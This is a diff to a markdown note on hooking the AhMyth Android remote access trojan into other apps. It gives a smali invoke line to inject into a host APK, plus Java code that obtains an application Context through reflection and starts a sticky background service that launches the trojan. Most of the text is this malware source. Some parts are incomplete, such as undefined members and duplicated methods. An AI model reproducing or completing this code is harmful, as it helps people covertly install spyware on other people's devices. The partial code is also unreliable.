@@ -2,13 +2,67 @@
 
 ## New Hook Method
 ```smali
-
 invoke-static, {} Lcom/package/ID/ahmyth/MainService;->start()V
 ```
-## New hopeful Hook start function for `MainService`
+## New hopeful Hook start function
+
+- MainService.java
 ```java
+    private static void findContext() throws Exception {
 
+        Class<?> activityThreadClass;
 
+        try {
+
+            activityThreadClass = Class.forName("android.app.ActivityThread");
+
+        } catch (ClassNotFoundException e) {
+
+            // No context
+
+            return;
+
+        }
+
+        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
+
+        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
+
+        if (context == null) {
+
+            // Post to the UI/Main thread and try and retrieve the Context
+
+            final Handler handler = new Handler(Looper.getMainLooper());
+
+            handler.post(new Runnable() {
+
+                public void run() {
+
+                    try {
+
+                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
+
+                        if (context != null) {
+
+                            startService(context);
+
+                        }
+
+                    } catch (Exception ignored) {
+
+                    }
+
+                }
+
+            });
+
+        } else {
+
+            startService(context);
+
+        }
+
+    }
 
     // Smali hook point
 
@@ -24,4 +78,115 @@ invoke-static, {} Lcom/package/ID/ahmyth/MainService;->start()V
 
     }
 
+    public static void startService(Context context) {
+
+        context.startService(new Intent(context, MainService.class));
+
+    }
+
+    @Override
+
+    public IBinder onBind(Intent intent) {
+
+        return null;
+
+    }
+
+    @Override
+
+    public int onStartCommand(Intent intent, int flags, int startId) {
+
+        HookStart.start(this);
+
+        return START_STICKY;
+
+    }
+
+}
+
+```
+
+- HookStart.java
+```java
+public class HookStart {
+
+
+    // Launched from activity
+
+    public static void start(Context context) {
+
+        HookStart.context = context;
+
+        startInPath(context.getFilesDir().toString());
+
+    }
+
+    public static void startContext() {
+
+        try {
+
+            findContext();
+
+        } catch (Exception ignored) {
+
+        }
+
+    }
+
+    private static void findContext() throws Exception {
+
+        Class<?> activityThreadClass;
+
+        try {
+
+            activityThreadClass = Class.forName("android.app.ActivityThread");
+
+        } catch (ClassNotFoundException e) {
+
+            // No context
+
+            return;
+
+        }
+
+        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
+
+        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
+
+        if (context == null) {
+
+            // Post to the UI/Main thread and try and retrieve the Context
+
+            final Handler handler = new Handler(Looper.getMainLooper());
+
+            handler.post(new Runnable() {
+
+                public void run() {
+
+                    try {
+
+                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
+
+                        if (context != null) {
+
+                            start(context);
+
+                        }
+
+                    } catch (Exception ignored) {
+
+                    }
+
+                }
+
+            });
+
+        } else {
+
+            start(context);
+
+        }
+
+    }
+}
 ```
